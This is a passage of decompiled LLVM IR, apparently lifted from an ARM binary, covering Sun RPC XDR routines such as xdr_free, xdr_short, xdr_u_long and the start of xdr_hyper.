  store i32 %v3_17e6c, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @sl, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %v2_17e70, i32* %r0.global-to-local, align 4
  %v1_17e88 = add i32 %arg2, 28
  %v2_17e88 = inttoptr i32 %v1_17e88 to i32*
  %v3_17e88 = load i32, i32* %v2_17e88, align 4
  %v4_17e8c = load i32, i32* %stack_var_-28, align 4
  %v10_17e8c = call i32 @__GI_xdrmem_create(i32* nonnull %stack_var_-52, i32 %v3_17e88, i32 %v3_17e6c, i32 1, i32 %v4_17e8c, i32 %v6_17e54, i32 %v9_17e54, i32 %v12_17e54, i32 %v15_17e54)
  store i32 %v2_17e70, i32* %r0.global-to-local, align 4
  %v3_17e98 = load i32, i32* %stack_var_-48, align 4
  store i32 ptrtoint (i32* @global_var_17ea4.897 to i32), i32* @lr, align 4
  %v1_17ea0 = add i32 %v3_17e98, 24
  %v2_17ea0 = inttoptr i32 %v1_17ea0 to i32*
  %v3_17ea0 = load i32, i32* %v2_17ea0, align 4
  call void @__pseudo_branch(i32 %v3_17ea0)
  %v0_17ea4 = load i32, i32* %r0.global-to-local, align 4
  %v2_17ea4 = icmp eq i32 %v0_17ea4, 0
  br i1 %v2_17ea4, label %dec_label_pc_1800c, label %dec_label_pc_17eac

dec_label_pc_17eac:                               ; preds = %entry
  %v2_17eb0 = load i32, i32* %stack_var_-52, align 4
  %v5_17eb0 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v5_17eb0, i32* %r4.global-to-local, align 4
  %v2_17ecc = call i32 @llvm.bswap.i32(i32 %v2_17eb0)
  %v1_17ed0 = load i32, i32* @r6, align 4
  %v2_17ed0 = inttoptr i32 %v1_17ed0 to i32*
  store i32 %v2_17ecc, i32* %v2_17ed0, align 4
  %v3_17ed4 = load i32, i32* %stack_var_-48, align 4
  %v1_17ed8 = udiv i32 %v3_17ed4, 256
  %v3_17ee0 = and i32 %v1_17ed8, 65280
  %v4_17eec = udiv i32 %v3_17ed4, 16777216
  %v5_17eec = or i32 %v3_17ee0, %v4_17eec
  store i32 %v5_17eec, i32* %r2.global-to-local, align 4
  %v2_17ef0 = call i32 @llvm.bswap.i32(i32 %v3_17ed4)
  store i32 %v2_17ef0, i32* @r5, align 4
  %v2_17ef4 = icmp ugt i32 %v2_17ef0, 254
  %v2_17ef8 = icmp ne i32 %v3_17ed4, -16777216
  %v3_17ef8 = and i1 %v2_17ef4, %v2_17ef8
  br i1 %v3_17ef8, label %dec_label_pc_18074, label %dec_label_pc_17efc

dec_label_pc_17efc:                               ; preds = %dec_label_pc_17eac
  %v2_17efc = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_17efc, i32* @r4, align 4
  store i32 %v2_17efc, i32* @r1, align 4
  store i32 %v2_17ef0, i32* @r2, align 4
  %v0_17f08 = load i32, i32* @r6, align 4
  %v1_17f08 = add i32 %v0_17f08, 4
  %v2_17f08 = inttoptr i32 %v1_17f08 to i32*
  %v3_17f08 = load i32, i32* %v2_17f08, align 4
  store i32 %v3_17f08, i32* @r0, align 4
  %v0_17f0c = call i32 @memcpy()
  store i32 %v0_17f0c, i32* %r0.global-to-local, align 4
  %v0_17f10 = load i32, i32* @r6, align 4
  %v1_17f10 = add i32 %v0_17f10, 4
  %v2_17f10 = inttoptr i32 %v1_17f10 to i32*
  %v3_17f10 = load i32, i32* %v2_17f10, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_17f18 = load i32, i32* @r5, align 4
  %v4_17f18 = add i32 %v3_17f18, %v3_17f10
  %v5_17f18 = inttoptr i32 %v4_17f18 to i8*
  store i8 0, i8* %v5_17f18, align 1
  %v0_17f1c = load i32, i32* @r5, align 4
  %v1_17f1c = add i32 %v0_17f1c, 3
  %v1_17f20 = and i32 %v1_17f1c, -4
  store i32 %v1_17f20, i32* %r5.global-to-local, align 4
  %v0_17f24 = load i32, i32* @r4, align 4
  %v2_17f24 = add i32 %v0_17f24, %v1_17f20
  %v3_17f24 = inttoptr i32 %v2_17f24 to i32*
  %v4_17f24 = load i32, i32* %v3_17f24, align 4
  %v1_17f2c = mul i32 %v4_17f24, 256
  %v3_17f34 = and i32 %v1_17f2c, 16711680
  %v4_17f38 = mul i32 %v4_17f24, 16777216
  %v5_17f38 = or i32 %v3_17f34, %v4_17f38
  store i32 %v5_17f38, i32* %r2.global-to-local, align 4
  %v2_17f40 = call i32 @llvm.bswap.i32(i32 %v4_17f24)
  %v1_17f44 = load i32, i32* @r6, align 4
  %v2_17f44 = add i32 %v1_17f44, 8
  %v3_17f44 = inttoptr i32 %v2_17f44 to i32*
  store i32 %v2_17f40, i32* %v3_17f44, align 4
  %v0_17f48 = load i32, i32* @r4, align 4
  %v1_17f48 = load i32, i32* %r5.global-to-local, align 4
  %v2_17f48 = add i32 %v1_17f48, %v0_17f48
  store i32 %v2_17f48, i32* %r4.global-to-local, align 4
  %v1_17f4c = add i32 %v2_17f48, 4
  %v2_17f4c = inttoptr i32 %v1_17f4c to i32*
  %v3_17f4c = load i32, i32* %v2_17f4c, align 4
  %v1_17f54 = mul i32 %v3_17f4c, 256
  %v3_17f5c = and i32 %v1_17f54, 16711680
  %v4_17f60 = mul i32 %v3_17f4c, 16777216
  %v5_17f60 = or i32 %v3_17f5c, %v4_17f60
  store i32 %v5_17f60, i32* %r2.global-to-local, align 4
  %v2_17f68 = call i32 @llvm.bswap.i32(i32 %v3_17f4c)
  %v1_17f6c = load i32, i32* @r6, align 4
  %v2_17f6c = add i32 %v1_17f6c, 12
  %v3_17f6c = inttoptr i32 %v2_17f6c to i32*
  store i32 %v2_17f68, i32* %v3_17f6c, align 4
  %v0_17f70 = load i32, i32* %r4.global-to-local, align 4
  %v1_17f70 = add i32 %v0_17f70, 4
  store i32 %v1_17f70, i32* %r4.global-to-local, align 4
  %v1_17f74 = add i32 %v0_17f70, 8
  %v2_17f74 = inttoptr i32 %v1_17f74 to i32*
  %v3_17f74 = load i32, i32* %v2_17f74, align 4
  %v1_17f78 = udiv i32 %v3_17f74, 256
  %v3_17f80 = and i32 %v1_17f78, 65280
  %v4_17f8c = udiv i32 %v3_17f74, 16777216
  %v5_17f8c = or i32 %v3_17f80, %v4_17f8c
  store i32 %v5_17f8c, i32* %r2.global-to-local, align 4
  %v2_17f90 = call i32 @llvm.bswap.i32(i32 %v3_17f74)
  store i32 %v2_17f90, i32* %ip.global-to-local, align 4
  %v7_17f94 = icmp eq i32 %v3_17f74, 268435456
  %v2_17f9c = icmp ult i32 %v2_17f90, 16
  %v3_17f9c = or i1 %v7_17f94, %v2_17f9c
  br i1 %v3_17f9c, label %dec_label_pc_17fdc.preheader, label %.thread41

.thread41:                                        ; preds = %dec_label_pc_17efc
  store i32 %v1_17f74, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18074

dec_label_pc_17fdc.preheader:                     ; preds = %dec_label_pc_17efc
  %v5_17f9c = add i32 %v0_17f70, 12
  store i32 %v5_17f9c, i32* %r4.global-to-local, align 4
  %v4_17fa0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v4_17fa0, i32* %lr.global-to-local, align 4
  %v5_17fa4 = load i32, i32* @r6, align 4
  %v6_17fa4 = add i32 %v5_17fa4, 16
  %v7_17fa4 = inttoptr i32 %v6_17fa4 to i32*
  store i32 %v2_17f90, i32* %v7_17fa4, align 4
  %v0_17fdc14 = load i32, i32* %lr.global-to-local, align 4
  %v1_17fdc15 = load i32, i32* %ip.global-to-local, align 4
  %v3_17fdc17 = icmp ult i32 %v0_17fdc14, %v1_17fdc15
  br i1 %v3_17fdc17, label %dec_label_pc_17fb0, label %dec_label_pc_17fe4

dec_label_pc_17fb0:                               ; preds = %dec_label_pc_17fdc.preheader, %dec_label_pc_17fb0
  %v2_17fd4 = phi i32 [ %v1_17fd8, %dec_label_pc_17fb0 ], [ %v0_17fdc14, %dec_label_pc_17fdc.preheader ]
  %v0_17fb0 = load i32, i32* %r4.global-to-local, align 4
  %v1_17fb0 = inttoptr i32 %v0_17fb0 to i32*
  %v2_17fb0 = load i32, i32* %v1_17fb0, align 4
  %v4_17fb0 = add i32 %v0_17fb0, 4
  store i32 %v4_17fb0, i32* %r4.global-to-local, align 4
  %v1_17fb8 = mul i32 %v2_17fb0, 256
  %v3_17fc0 = and i32 %v1_17fb8, 16711680
  store i32 %v3_17fc0, i32* %r2.global-to-local, align 4
  %v0_17fc4 = load i32, i32* @r6, align 4
  %v1_17fc4 = add i32 %v0_17fc4, 20
  %v2_17fc4 = inttoptr i32 %v1_17fc4 to i32*
  %v3_17fc4 = load i32, i32* %v2_17fc4, align 4
  store i32 %v3_17fc4, i32* %r0.global-to-local, align 4
  %v4_17fc8 = mul i32 %v2_17fb0, 16777216
  %v5_17fc8 = or i32 %v3_17fc0, %v4_17fc8
  store i32 %v5_17fc8, i32* %r2.global-to-local, align 4
  %v2_17fd0 = call i32 @llvm.bswap.i32(i32 %v2_17fb0)
  %v5_17fd4 = mul i32 %v2_17fd4, 4
  %v6_17fd4 = add i32 %v3_17fc4, %v5_17fd4
  %v7_17fd4 = inttoptr i32 %v6_17fd4 to i32*
  store i32 %v2_17fd0, i32* %v7_17fd4, align 4
  %v0_17fd8 = load i32, i32* %lr.global-to-local, align 4
  %v1_17fd8 = add i32 %v0_17fd8, 1
  store i32 %v1_17fd8, i32* %lr.global-to-local, align 4
  %v1_17fdc = load i32, i32* %ip.global-to-local, align 4
  %v3_17fdc = icmp ult i32 %v1_17fd8, %v1_17fdc
  br i1 %v3_17fdc, label %dec_label_pc_17fb0, label %dec_label_pc_17fdc.dec_label_pc_17fe4_crit_edge

dec_label_pc_17fdc.dec_label_pc_17fe4_crit_edge:  ; preds = %dec_label_pc_17fb0
  br label %dec_label_pc_17fe4

dec_label_pc_17fe4:                               ; preds = %dec_label_pc_17fdc.preheader, %dec_label_pc_17fdc.dec_label_pc_17fe4_crit_edge
  %v0_17ff4 = phi i32 [ %v1_17fdc, %dec_label_pc_17fdc.dec_label_pc_17fe4_crit_edge ], [ %v1_17fdc15, %dec_label_pc_17fdc.preheader ]
  %v0_17fe4 = load i32, i32* %r5.global-to-local, align 4
  %v1_17fe4 = add i32 %v0_17fe4, 20
  %v4_17fe8 = mul i32 %v0_17ff4, 4
  %v5_17fe8 = add i32 %v1_17fe4, %v4_17fe8
  %v1_17fec = load i32, i32* @r8, align 4
  %tmp = icmp ugt i32 %v5_17fe8, %v1_17fec
  br i1 %tmp, label %dec_label_pc_17ff4, label %dec_label_pc_18038

dec_label_pc_17ff4:                               ; preds = %dec_label_pc_17fe4
  store i32 %v0_17fe4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([36 x i8]* @global_var_1dd20.899 to i32), i32* %r0.global-to-local, align 4
  %v6_18004 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @global_var_1dd20.899, i32 0, i32 0), i32 %v0_17ff4, i32 %v0_17fe4, i32 %v1_17fec)
  store i32 %v6_18004, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18074

dec_label_pc_1800c:                               ; preds = %entry
  store i32 %v2_17e70, i32* %r0.global-to-local, align 4
  %v0_18010 = load i32, i32* @r6, align 4
  %v3_18014 = call i32 @__GI_xdr_authunix_parms(i32* nonnull %stack_var_-52, i32 %v0_18010)
  store i32 %v3_18014, i32* %r0.global-to-local, align 4
  %v2_18018 = icmp eq i32 %v3_18014, 0
  br i1 %v2_18018, label %dec_label_pc_18020, label %dec_label_pc_18038

dec_label_pc_18020:                               ; preds = %dec_label_pc_1800c
  store i32 %v2_17e70, i32* %r0.global-to-local, align 4
  %v0_18028 = load i32, i32* @r6, align 4
  store i32 2, i32* %stack_var_-52, align 4
  %v3_18030 = call i32 @__GI_xdr_authunix_parms(i32* nonnull %stack_var_-52, i32 %v0_18028)
  store i32 %v3_18030, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18074

dec_label_pc_18038:                               ; preds = %dec_label_pc_17fe4, %dec_label_pc_1800c
  %v0_18038 = load i32, i32* @r7, align 4
  %v1_18038 = add i32 %v0_18038, 44
  %v2_18038 = inttoptr i32 %v1_18038 to i32*
  %v3_18038 = load i32, i32* %v2_18038, align 4
  store i32 %v3_18038, i32* %ip.global-to-local, align 4
  %v2_1803c = icmp eq i32 %v3_18038, 0
  %v0_18040 = load i32, i32* @sl, align 4
  %v1_18040 = add i32 %v0_18040, 28
  %v2_18040 = inttoptr i32 %v1_18040 to i32*
  %v3_18040 = load i32, i32* %v2_18040, align 4
  store i32 %v3_18040, i32* %r2.global-to-local, align 4
  br i1 %v2_1803c, label %.thread11, label %._crit_edge

._crit_edge:                                      ; preds = %dec_label_pc_18038
  %v2_18044 = add i32 %v0_18038, 36
  %v3_18044 = inttoptr i32 %v2_18044 to i32*
  %v4_18044 = load i32, i32* %v3_18044, align 4
  %v3_18048 = add i32 %v3_18040, 32
  %v4_18048 = inttoptr i32 %v3_18048 to i32*
  store i32 %v4_18044, i32* %v4_18048, align 4
  %v1_1804c = load i32, i32* @r7, align 4
  %v2_1804c = add i32 %v1_1804c, 40
  %v3_1804c = inttoptr i32 %v2_1804c to i32*
  %v4_1804c = load i32, i32* %v3_1804c, align 4
  store i32 %v4_1804c, i32* %r2.global-to-local, align 4
  %v1_18050 = load i32, i32* @sl, align 4
  %v2_18050 = add i32 %v1_18050, 28
  %v3_18050 = inttoptr i32 %v2_18050 to i32*
  %v4_18050 = load i32, i32* %v3_18050, align 4
  %v3_18058 = add i32 %v4_18050, 36
  %v4_18058 = inttoptr i32 %v3_18058 to i32*
  store i32 %v4_1804c, i32* %v4_18058, align 4
  %v1_18060.pre = load i32, i32* @sl, align 4
  %phitmp = add i32 %v1_18060.pre, 28
  %phitmp35 = inttoptr i32 %phitmp to i32*
  %v4_18060 = load i32, i32* %phitmp35, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v0_1806c.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb

.thread11:                                        ; preds = %dec_label_pc_18038
  %.pre = add i32 %v3_18040, 32
  %.pre34 = inttoptr i32 %.pre to i32*
  store i32 0, i32* %.pre34, align 4
  %v1_1805c = load i32, i32* @sl, align 4
  %v2_1805c = add i32 %v1_1805c, 28
  %v3_1805c = inttoptr i32 %v2_1805c to i32*
  %v4_1805c = load i32, i32* %v3_1805c, align 4
  %v1_18068 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v1_18068, i32* %r4.global-to-local, align 4
  br label %bb

bb:                                               ; preds = %._crit_edge, %.thread11
  %v1_1806c43 = phi i32 [ %v4_18060, %._crit_edge ], [ %v4_1805c, %.thread11 ]
  %v0_1806c = phi i32 [ %v0_1806c.pre, %._crit_edge ], [ %v1_18068, %.thread11 ]
  %v2_1806c = add i32 %v1_1806c43, 40
  %v3_1806c = inttoptr i32 %v2_1806c to i32*
  store i32 %v0_1806c, i32* %v3_1806c, align 4
  br label %dec_label_pc_18078

dec_label_pc_18074:                               ; preds = %.thread41, %dec_label_pc_17eac, %dec_label_pc_18020, %dec_label_pc_17ff4
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18078

dec_label_pc_18078:                               ; preds = %bb, %dec_label_pc_18074
  %v3_18078 = load i32, i32* %stack_var_-48, align 4
  %v1_1807c = add i32 %v3_18078, 28
  %v2_1807c = inttoptr i32 %v1_1807c to i32*
  %v3_1807c = load i32, i32* %v2_1807c, align 4
  %v2_18080 = icmp eq i32 %v3_1807c, 0
  br i1 %v2_18080, label %.thread13, label %bb55

bb55:                                             ; preds = %dec_label_pc_18078
  store i32 %v2_17e70, i32* %r0.global-to-local, align 4
  store i32 98448, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v3_1807c)
  br label %.thread13

.thread13:                                        ; preds = %dec_label_pc_18078, %bb55
  %v0_18090 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_18090, i32* %r0.global-to-local, align 4
  %v2_18098 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_18098, i32* %r4.global-to-local, align 4
  store i32 %v6_17e54, i32* %r5.global-to-local, align 4
  ret i32 %v0_18090

; uselistorder directives
  uselistorder i32 %v1_17fec, { 1, 0 }
  uselistorder i32 %v0_17fe4, { 1, 0, 2 }
  uselistorder i32 %v1_17fd8, { 1, 2, 0 }
  uselistorder i32 %v2_17fb0, { 2, 0, 1 }
  uselistorder i32 %v2_17f90, { 2, 0, 1 }
  uselistorder i32 %v3_17f74, { 2, 3, 0, 1 }
  uselistorder i32 %v3_17f4c, { 2, 0, 1 }
  uselistorder i32 %v4_17f24, { 2, 0, 1 }
  uselistorder i32 %v2_17ef0, { 2, 1, 0 }
  uselistorder i32 %v3_17ed4, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-28, { 1, 0, 2 }
  uselistorder i32* %stack_var_-52, { 0, 3, 2, 4, 1, 5 }
  uselistorder i32* %stack_var_-48, { 0, 1, 3, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 3, 1, 2, 4, 5, 10, 11, 12, 6, 7, 8, 9 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 6, 5, 11, 7, 8, 9, 10, 12, 14, 15, 13, 0 }
  uselistorder i32 65280, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %dec_label_pc_18078, { 1, 0 }
  uselistorder label %dec_label_pc_18074, { 2, 3, 0, 1 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_18038, { 1, 0 }
  uselistorder label %dec_label_pc_17fe4, { 1, 0 }
  uselistorder label %dec_label_pc_17fb0, { 1, 0 }
}

define i32 @xdr_free(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v2_180a8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 2, i32* %stack_var_-28, align 4
  call void @__pseudo_branch(i32 %arg1)
  ret i32 %v2_180a8
}

define i32 @xdr_void() local_unnamed_addr {
entry:
  ret i32 1
}

define i32 @__GI_xdr_long() local_unnamed_addr {
entry:
  %v0_180d4 = load i32, i32* @r0, align 4
  %v1_180d4 = inttoptr i32 %v0_180d4 to i32*
  %v2_180d4 = load i32, i32* %v1_180d4, align 4
  %v2_180d8 = icmp eq i32 %v2_180d4, 0
  br i1 %v2_180d8, label %dec_label_pc_180e0, label %dec_label_pc_180f0

dec_label_pc_180e0:                               ; preds = %entry
  %v1_180e0 = add i32 %v0_180d4, 4
  %v2_180e0 = inttoptr i32 %v1_180e0 to i32*
  %v3_180e0 = load i32, i32* %v2_180e0, align 4
  store i32 98540, i32* @lr, align 4
  %v1_180e8 = add i32 %v3_180e0, 4
  %v2_180e8 = inttoptr i32 %v1_180e8 to i32*
  %v3_180e8 = load i32, i32* %v2_180e8, align 4
  call void @__pseudo_branch(i32 %v3_180e8)
  %v5_180ec = load i32, i32* @r0, align 4
  ret i32 %v5_180ec

dec_label_pc_180f0:                               ; preds = %entry
  %v7_180f0 = icmp eq i32 %v2_180d4, 1
  br i1 %v7_180f0, label %dec_label_pc_180f8, label %dec_label_pc_18108

dec_label_pc_180f8:                               ; preds = %dec_label_pc_180f0
  %v1_180f8 = add i32 %v0_180d4, 4
  %v2_180f8 = inttoptr i32 %v1_180f8 to i32*
  %v3_180f8 = load i32, i32* %v2_180f8, align 4
  store i32 98564, i32* @lr, align 4
  %v1_18100 = inttoptr i32 %v3_180f8 to i32*
  %v2_18100 = load i32, i32* %v1_18100, align 4
  call void @__pseudo_branch(i32 %v2_18100)
  %v5_18104 = load i32, i32* @r0, align 4
  ret i32 %v5_18104

dec_label_pc_18108:                               ; preds = %dec_label_pc_180f0
  %v7_18108 = icmp eq i32 %v2_180d4, 2
  %. = zext i1 %v7_18108 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v0_180d4, { 1, 0, 2 }
}

define i32 @xdr_short(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_18118 = load i32, i32* @r4, align 4
  store i32 %v3_18118, i32* %stack_var_-12, align 4
  %v0_1811c = load i32, i32* %r0.global-to-local, align 4
  %v1_1811c = inttoptr i32 %v0_1811c to i32*
  %v2_1811c = load i32, i32* %v1_1811c, align 4
  store i32 %v2_1811c, i32* %r4.global-to-local, align 4
  %v7_18124 = icmp eq i32 %v2_1811c, 1
  store i1 %v7_18124, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* %r5.global-to-local, align 4
  br i1 %v7_18124, label %dec_label_pc_18174, label %dec_label_pc_18134

dec_label_pc_18134:                               ; preds = %entry
  %v2_18124 = icmp eq i32 %v2_1811c, 0
  br i1 %v2_18124, label %dec_label_pc_1814c, label %dec_label_pc_1813c

dec_label_pc_1813c:                               ; preds = %dec_label_pc_18134
  %v7_1813c = icmp eq i32 %v2_1811c, 2
  store i1 %v7_1813c, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %r0.global-to-local, align 4
  br i1 %v7_1813c, label %dec_label_pc_181a0, label %dec_label_pc_1819c

dec_label_pc_1814c:                               ; preds = %dec_label_pc_18134
  %v1_1814c = add i32 %arg2, 1
  %v2_1814c = inttoptr i32 %v1_1814c to i8*
  %v3_1814c = load i8, i8* %v2_1814c, align 1
  %v4_1814c = zext i8 %v3_1814c to i32
  %v1_18150 = inttoptr i32 %arg2 to i8*
  %v2_18150 = load i8, i8* %v1_18150, align 1
  %v3_18150 = zext i8 %v2_18150 to i32
  %v3_18154 = mul nuw i32 %v4_1814c, 16777216
  %v4_18158 = sdiv i32 %v3_18154, 65536
  %v5_18158 = or i32 %v4_18158, %v3_18150
  store i32 %v5_18158, i32* %r2.global-to-local, align 4
  store i8 %v2_18150, i8* %stack_var_-16, align 1
  %v1_18164 = add i32 %v0_1811c, 4
  %v2_18164 = inttoptr i32 %v1_18164 to i32*
  %v3_18164 = load i32, i32* %v2_18164, align 4
  %v1_1816c = add i32 %v3_18164, 4
  %v2_1816c = inttoptr i32 %v1_1816c to i32*
  %v3_1816c = load i32, i32* %v2_1816c, align 4
  call void @__pseudo_branch(i32 %v3_1816c)
  br label %dec_label_pc_181a0

dec_label_pc_18174:                               ; preds = %entry
  %v1_18174 = add i32 %v0_1811c, 4
  %v2_18174 = inttoptr i32 %v1_18174 to i32*
  %v3_18174 = load i32, i32* %v2_18174, align 4
  %v1_1817c = inttoptr i32 %v3_18174 to i32*
  %v2_1817c = load i32, i32* %v1_1817c, align 4
  call void @__pseudo_branch(i32 %v2_1817c)
  %v0_18180 = load i32, i32* %r0.global-to-local, align 4
  %v2_18180 = icmp eq i32 %v0_18180, 0
  store i1 %v2_18180, i1* %cpsr_z.global-to-local, align 1
  %v0_18184 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_18184, i32* %r0.global-to-local, align 4
  br i1 %v2_18180, label %dec_label_pc_1819c, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_18174
  %v3_18188 = load i8, i8* %stack_var_-16, align 1
  %v4_18188 = sext i8 %v3_18188 to i32
  store i32 %v4_18188, i32* %r2.global-to-local, align 4
  %v4_1818c = sdiv i32 %v4_18188, 256
  %v2_18190 = trunc i32 %v4_1818c to i8
  %v3_18190 = load i32, i32* %r5.global-to-local, align 4
  %v4_18190 = add i32 %v3_18190, 1
  %v5_18190 = inttoptr i32 %v4_18190 to i8*
  store i8 %v2_18190, i8* %v5_18190, align 1
  %v0_18194.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18194.pr.pr, label %dec_label_pc_1819c, label %.thread3

.thread3:                                         ; preds = %.thread2
  %v1_18194 = load i32, i32* %r2.global-to-local, align 4
  %v2_18194 = trunc i32 %v1_18194 to i8
  %v3_18194 = load i32, i32* %r5.global-to-local, align 4
  %v4_18194 = inttoptr i32 %v3_18194 to i8*
  store i8 %v2_18194, i8* %v4_18194, align 1
  %v0_18198.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18198.pr.pr.pr, label %dec_label_pc_1819c, label %dec_label_pc_181a0

dec_label_pc_1819c:                               ; preds = %dec_label_pc_18174, %.thread2, %.thread3, %dec_label_pc_1813c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_181a0

dec_label_pc_181a0:                               ; preds = %dec_label_pc_1813c, %.thread3, %dec_label_pc_1814c, %dec_label_pc_1819c
  %v2_181a4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_181a4, i32* %r4.global-to-local, align 4
  %v11_181a4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v11_181a4

; uselistorder directives
  uselistorder i32 %v2_1811c, { 0, 2, 1, 3 }
  uselistorder i8* %stack_var_-16, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 3, 4, 0, 6, 1, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_181a0, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1819c, { 2, 1, 0, 3 }
}

define i32 @__GI_xdr_int() local_unnamed_addr {
entry:
  %v0_181a8 = call i32 @__GI_xdr_long()
  ret i32 %v0_181a8
}

define i32 @xdr_u_long() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_181ac = load i32, i32* @r4, align 4
  store i32 %v3_181ac, i32* %stack_var_-12, align 4
  %v0_181b0 = load i32, i32* @r0, align 4
  %v1_181b0 = inttoptr i32 %v0_181b0 to i32*
  %v2_181b0 = load i32, i32* %v1_181b0, align 4
  store i32 %v2_181b0, i32* %r4.global-to-local, align 4
  %v7_181b4 = icmp eq i32 %v2_181b0, 1
  %v0_181bc = load i32, i32* @r1, align 4
  store i32 %v0_181bc, i32* %r5.global-to-local, align 4
  br i1 %v7_181b4, label %dec_label_pc_181d8, label %dec_label_pc_181c4

dec_label_pc_181c4:                               ; preds = %entry
  %v2_181b4 = icmp eq i32 %v2_181b0, 0
  br i1 %v2_181b4, label %dec_label_pc_18200, label %dec_label_pc_181c8

dec_label_pc_181c8:                               ; preds = %dec_label_pc_181c4
  %v7_181c8 = icmp eq i32 %v2_181b0, 2
  store i32 1, i32* @r0, align 4
  br i1 %v7_181c8, label %dec_label_pc_18214, label %dec_label_pc_18210

dec_label_pc_181d8:                               ; preds = %entry
  %v1_181d8 = add i32 %v0_181b0, 4
  %v2_181d8 = inttoptr i32 %v1_181d8 to i32*
  %v3_181d8 = load i32, i32* %v2_181d8, align 4
  store i32 98792, i32* @lr, align 4
  %v1_181e4 = inttoptr i32 %v3_181d8 to i32*
  %v2_181e4 = load i32, i32* %v1_181e4, align 4
  call void @__pseudo_branch(i32 %v2_181e4)
  %v0_181e8 = load i32, i32* @r0, align 4
  %v2_181e8 = icmp eq i32 %v0_181e8, 0
  br i1 %v2_181e8, label %.thread3, label %bb

.thread3:                                         ; preds = %dec_label_pc_181d8
  br label %dec_label_pc_18210

bb:                                               ; preds = %dec_label_pc_181d8
  %v3_181ec = load i32, i32* %stack_var_-16, align 4
  %v0_181f0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_181f0, i32* @r0, align 4
  %v2_181f4 = load i32, i32* %r5.global-to-local, align 4
  %v3_181f4 = inttoptr i32 %v2_181f4 to i32*
  store i32 %v3_181ec, i32* %v3_181f4, align 4
  br label %dec_label_pc_18214

dec_label_pc_18200:                               ; preds = %dec_label_pc_181c4
  %v1_18200 = add i32 %v0_181b0, 4
  %v2_18200 = inttoptr i32 %v1_18200 to i32*
  %v3_18200 = load i32, i32* %v2_18200, align 4
  store i32 98828, i32* @lr, align 4
  %v1_18208 = add i32 %v3_18200, 4
  %v2_18208 = inttoptr i32 %v1_18208 to i32*
  %v3_18208 = load i32, i32* %v2_18208, align 4
  call void @__pseudo_branch(i32 %v3_18208)
  br label %dec_label_pc_18214

dec_label_pc_18210:                               ; preds = %.thread3, %dec_label_pc_181c8
  store i32 0, i32* @r0, align 4
  br label %dec_label_pc_18214

dec_label_pc_18214:                               ; preds = %bb, %dec_label_pc_181c8, %dec_label_pc_18200, %dec_label_pc_18210
  %v2_18218 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18218, i32* @r4, align 4
  %v11_18218 = load i32, i32* @r0, align 4
  ret i32 %v11_18218

; uselistorder directives
  uselistorder i32 %v2_181b0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_181b0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_18214, { 3, 2, 0, 1 }
}

define i32 @xdr_u_int(i32* %xdrs, i32* %ulp) local_unnamed_addr {
entry:
  %v0_1821c = call i32 @xdr_u_long()
  ret i32 %v0_1821c
}

define i32 @__GI_xdr_hyper() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_18220 = load i32, i32* @r4, align 4
